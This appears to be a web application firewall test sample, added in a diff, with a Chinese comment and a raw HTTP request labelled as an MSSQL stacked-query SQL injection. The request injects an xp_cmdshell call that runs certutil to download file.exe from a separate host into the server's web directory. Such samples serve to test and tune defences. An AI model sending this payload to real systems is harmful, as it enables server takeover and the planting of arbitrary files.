@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506405
+# 攻击者基于堆叠查询，将"exec master.dbo.xp_cmdshell 'cd c:/www & certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe';"语句注入到 SQL 查询参数中，通过存储过程master.dbo.xp_cmdshell执行cmd系统命令，可以上传任意文件到一个可读可写的目录。
+GET /?id=1%3Bexec%20master.dbo.xp_cmdshell%20%27cd%20c:%2Fwww%20&%20certutil%20-urlcache%20-split%20-f%20http:%2F%2F192.168.130.142:80%2Fdownload%2Ffile.exe%27%3B&bid=hd_tag_m8mv23ms HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23ms
+RM-PRO-Token: ce7cec8026b5286f989f96efb39ef859
+RM-PRO-Time: 1742808331791
+User-Agent: curl/7.83.1
+
